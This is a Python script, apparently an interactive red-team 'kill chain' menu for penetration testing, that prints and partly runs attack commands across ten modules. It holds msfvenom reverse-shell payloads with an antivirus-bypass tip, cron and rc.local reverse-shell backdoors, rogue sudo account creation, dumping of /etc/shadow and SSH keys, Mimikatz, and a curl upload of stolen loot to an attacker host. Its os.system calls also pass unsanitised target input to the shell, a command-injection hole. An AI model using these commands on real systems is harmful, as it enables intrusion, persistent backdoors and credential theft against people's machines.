#!/usr/bin/env python3
"""
Red Team Modified Unified Kill Chain
Modular Framework for Authorized Penetration Testing Only
"""

import subprocess
import sys
import os
import shutil

# ─────────────────────────────────────────────
# ANSI Colors
# ─────────────────────────────────────────────
R = "\033[91m"   # Red
Y = "\033[93m"   # Yellow
G = "\033[92m"   # Green
C = "\033[96m"   # Cyan
W = "\033[97m"   # White
DIM = "\033[2m"
RESET = "\033[0m"
BOLD = "\033[1m"

BANNER = f"""
{R}{BOLD}
 ██╗  ██╗██╗██╗     ██╗      ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
 ██║ ██╔╝██║██║     ██║     ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
 █████╔╝ ██║██║     ██║     ██║     ███████║███████║██║██╔██╗ ██║
 ██╔═██╗ ██║██║     ██║     ██║     ██╔══██║██╔══██║██║██║╚██╗██║
 ██║  ██╗██║███████╗███████╗╚██████╗██║  ██║██║  ██║██║██║ ╚████║
 ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{RESET}{DIM}{W} Red Team Modified Unified Kill Chain — For Authorized Use Only{RESET}
"""


# ─────────────────────────────────────────────
# MODULE 1 — SETUP
# ─────────────────────────────────────────────
def module_setup():
    print(f"\n{R}[MODULE 1]{RESET}{BOLD} SETUP — Installing Termux & Tooling{RESET}")
    tools = ["nmap", "metasploit-framework", "hydra", "sqlmap", "netcat"]
    print(f"{DIM}  Tools to verify: {', '.join(tools)}{RESET}")
    for tool in tools:
        found = shutil.which(tool) is not None
        status = f"{G}[FOUND]{RESET}" if found else f"{Y}[MISSING]{RESET}"
        print(f"  {status} {tool}")
    print(f"{DIM}  Tip: Use pkg install / apt install inside Termux{RESET}")


# ─────────────────────────────────────────────
# MODULE 2 — RECONNAISSANCE
# ─────────────────────────────────────────────
def module_recon(target: str):
    print(f"\n{R}[MODULE 2]{RESET}{BOLD} RECONNAISSANCE — OSINT & Surface Mapping{RESET}")
    print(f"  {C}Target:{RESET} {target}")
    print(f"  {DIM}Running DNS lookup...{RESET}")
    os.system(f"host {target} 2>/dev/null || nslookup {target}")
    print(f"\n  {DIM}Suggested OSINT tools:{RESET}")
    for tool in ["theHarvester", "Shodan CLI", "Maltego", "WHOIS"]:
        print(f"    {Y}•{RESET} {tool}")


# ─────────────────────────────────────────────
# MODULE 3 — ENUMERATION
# ─────────────────────────────────────────────
def module_enum(target: str):
    print(f"\n{R}[MODULE 3]{RESET}{BOLD} ENUMERATION — Ports, Services, Users{RESET}")
    print(f"  {C}Target:{RESET} {target}")
    print(f"  {DIM}Running quick nmap scan...{RESET}")
    os.system(f"nmap -sV --open -T4 {target} 2>/dev/null || echo '  [!] nmap not found — install it first'")
    print(f"\n  {DIM}Additional enum commands:{RESET}")
    cmds = [
        f"enum4linux -a {target}",
        f"snmpwalk -c public -v1 {target}",
        f"nikto -h {target}",
    ]
    for cmd in cmds:
        print(f"    {Y}${RESET} {cmd}")


# ─────────────────────────────────────────────
# MODULE 4 — PAYLOAD DELIVERY
# ─────────────────────────────────────────────
def module_payload(lhost: str, lport: str = "4444"):
    print(f"\n{R}[MODULE 4]{RESET}{BOLD} PAYLOAD DELIVERY — Craft & Stage{RESET}")
    print(f"  {C}LHOST:{RESET} {lhost}  {C}LPORT:{RESET} {lport}")
    payloads = [
        f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf",
        f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe",
        f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o shell.apk",
    ]
    print(f"  {DIM}Sample msfvenom commands:{RESET}")
    for p in payloads:
        print(f"    {Y}${RESET} {p}")
    print(f"  {DIM}AV bypass: use --encoder x86/shikata_ga_nai -i 10{RESET}")


# ─────────────────────────────────────────────
# MODULE 5 — EXPLOITATION
# ─────────────────────────────────────────────
def module_exploit(target: str):
    print(f"\n{R}[MODULE 5]{RESET}{RESET}{BOLD} EXPLOITATION — Trigger Vulnerability{RESET}")
    print(f"  {C}Target:{RESET} {target}")
    print(f"  {DIM}Common exploit vectors:{RESET}")
    vectors = [
        "SQLi       → sqlmap -u 'http://" + target + "/page?id=1' --dbs",
        "RCE        → exploit/multi/handler via Metasploit",
        "Brute      → hydra -L users.txt -P pass.txt " + target + " ssh",
        "Web vuln   → burpsuite / OWASP ZAP active scan",
    ]
    for v in vectors:
        print(f"    {Y}•{RESET} {v}")


# ─────────────────────────────────────────────
# MODULE 6 — INITIAL ACCESS
# ─────────────────────────────────────────────
def module_initial_access(lhost: str, lport: str = "4444"):
    print(f"\n{R}[MODULE 6]{RESET}{BOLD} INITIAL ACCESS — C2 Foothold{RESET}")
    print(f"  {C}Starting listener on {lhost}:{lport}{RESET}")
    msf_cmds = [
        "use exploit/multi/handler",
        "set PAYLOAD linux/x86/meterpreter/reverse_tcp",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "exploit -j",
    ]
    print(f"  {DIM}Metasploit listener setup:{RESET}")
    for cmd in msf_cmds:
        print(f"    {Y}msf6>{RESET} {cmd}")
    print(f"  {DIM}Alternative: nc -lvnp {lport}{RESET}")


# ─────────────────────────────────────────────
# MODULE 7 — PRIVILEGE ESCALATION
# ─────────────────────────────────────────────
def module_privesc():
    print(f"\n{R}[MODULE 7]{RESET}{BOLD} PRIVILEGE ESCALATION — SYSTEM / root{RESET}")
    checks = {
        "SUID binaries":     "find / -perm -u=s -type f 2>/dev/null",
        "Sudo misconfig":    "sudo -l",
        "Writable cron":     "cat /etc/crontab",
        "Kernel version":    "uname -a",
        "LinPEAS":           "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    }
    for name, cmd in checks.items():
        print(f"  {Y}[{name}]{RESET}")
        print(f"    {DIM}$ {cmd}{RESET}")


# ─────────────────────────────────────────────
# MODULE 8 — PERSISTENCE
# ─────────────────────────────────────────────
def module_persistence(lhost: str, lport: str = "4444"):
    print(f"\n{R}[MODULE 8]{RESET}{BOLD} PERSISTENCE — Backdoors & Implants{RESET}")
    methods = {
        "Cron backdoor":     f"(crontab -l; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1') | crontab -",
        "SSH key inject":    "echo '<your_pub_key>' >> ~/.ssh/authorized_keys",
        "Rogue user":        "useradd -m -s /bin/bash -G sudo ghost && echo 'ghost:p@ss' | chpasswd",
        "Startup script":    f"echo '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' >> /etc/rc.local",
    }
    for name, cmd in methods.items():
        print(f"  {Y}[{name}]{RESET}")
        print(f"    {DIM}$ {cmd}{RESET}")


# ─────────────────────────────────────────────
# MODULE 9 — ASSET COLLECTION
# ─────────────────────────────────────────────
def module_assets(output_dir: str = "/tmp/loot"):
    print(f"\n{R}[MODULE 9]{RESET}{BOLD} ASSET COLLECTION — Exfiltrate Data{RESET}")
    print(f"  {C}Loot directory:{RESET} {output_dir}")
    os.makedirs(output_dir, exist_ok=True)
    commands = {
        "Dump /etc/passwd":  f"cat /etc/passwd > {output_dir}/passwd.txt",
        "Dump /etc/shadow":  f"cat /etc/shadow > {output_dir}/shadow.txt",
        "SSH keys":          f"cp -r ~/.ssh {output_dir}/ssh_keys 2>/dev/null",
        "Bash history":      f"cat ~/.bash_history > {output_dir}/history.txt",
        "Mimikatz (Win)":    "sekurlsa::logonpasswords",
    }
    for name, cmd in commands.items():
        print(f"  {Y}[{name}]{RESET}")
        print(f"    {DIM}$ {cmd}{RESET}")
    print(f"  {DIM}Exfil: tar czf loot.tar.gz {output_dir} && curl -F 'f=@loot.tar.gz' http://{'{'}LHOST{'}'}/upload{RESET}")


# ─────────────────────────────────────────────
# MODULE 10 — PIVOTING
# ─────────────────────────────────────────────
def module_pivot(pivot_host: str, target_subnet: str = "192.168.1.0/24"):
    print(f"\n{R}[MODULE 10]{RESET}{BOLD} PIVOTING — Lateral Movement{RESET}")
    print(f"  {C}Pivot host:{RESET} {pivot_host}  {C}Target subnet:{RESET} {target_subnet}")
    techniques = {
        "SSH tunnel":        f"ssh -D 9050 user@{pivot_host}",
        "Chisel server":     f"chisel server -p 8080 --reverse",
        "Chisel client":     f"chisel client {pivot_host}:8080 R:socks",
        "Proxychains scan":  f"proxychains nmap -sT {target_subnet}",
        "Pass-the-Hash":     f"pth-winexe -U 'domain/user%<hash>' //{pivot_host} cmd.exe",
    }
    for name, cmd in techniques.items():
        print(f"  {Y}[{name}]{RESET}")
        print(f"    {DIM}$ {cmd}{RESET}")


# ─────────────────────────────────────────────
# MENU
# ─────────────────────────────────────────────
def menu():
    print(BANNER)
    print(f"{BOLD}{W}  Select a module to run:{RESET}\n")
    modules = [
        " 1  Setup              — Install & verify tools",
        " 2  Reconnaissance     — OSINT & DNS mapping",
        " 3  Enumeration        — Ports, services, users",
        " 4  Payload Delivery   — Craft payloads",
        " 5  Exploitation       — Attack vectors",
        " 6  Initial Access     — C2 listener setup",
        " 7  Privilege Escalation — Root / SYSTEM",
        " 8  Persistence        — Backdoors & implants",
        " 9  Asset Collection   — Loot & exfil",
        "10  Pivoting           — Lateral movement",
        " 0  Exit",
    ]
    for m in modules:
        print(f"  {R}[{m[:2].strip()}]{RESET}{m[2:]}")

    choice = input(f"\n{Y}  redteam>{RESET} ").strip()

    if choice == "1":
        module_setup()
    elif choice == "2":
        t = input(f"  {C}Target IP/domain:{RESET} ").strip()
        module_recon(t)
    elif choice == "3":
        t = input(f"  {C}Target IP:{RESET} ").strip()
        module_enum(t)
    elif choice == "4":
        lh = input(f"  {C}LHOST:{RESET} ").strip()
        lp = input(f"  {C}LPORT [4444]:{RESET} ").strip() or "4444"
        module_payload(lh, lp)
    elif choice == "5":
        t = input(f"  {C}Target IP/URL:{RESET} ").strip()
        module_exploit(t)
    elif choice == "6":
        lh = input(f"  {C}LHOST:{RESET} ").strip()
        lp = input(f"  {C}LPORT [4444]:{RESET} ").strip() or "4444"
        module_initial_access(lh, lp)
    elif choice == "7":
        module_privesc()
    elif choice == "8":
        lh = input(f"  {C}LHOST:{RESET} ").strip()
        lp = input(f"  {C}LPORT [4444]:{RESET} ").strip() or "4444"
        module_persistence(lh, lp)
    elif choice == "9":
        out = input(f"  {C}Loot output dir [/tmp/loot]:{RESET} ").strip() or "/tmp/loot"
        module_assets(out)
    elif choice == "10":
        ph = input(f"  {C}Pivot host IP:{RESET} ").strip()
        sn = input(f"  {C}Target subnet [192.168.1.0/24]:{RESET} ").strip() or "192.168.1.0/24"
        module_pivot(ph, sn)
    elif choice == "0":
        print(f"\n  {DIM}Exiting. Stay authorized.{RESET}\n")
        sys.exit(0)
    else:
        print(f"  {Y}[!] Invalid choice{RESET}")

    input(f"\n  {DIM}Press Enter to return to menu...{RESET}")
    menu()


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────
if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n\n  {DIM}Interrupted. Exiting.{RESET}\n")
        sys.exit(0)
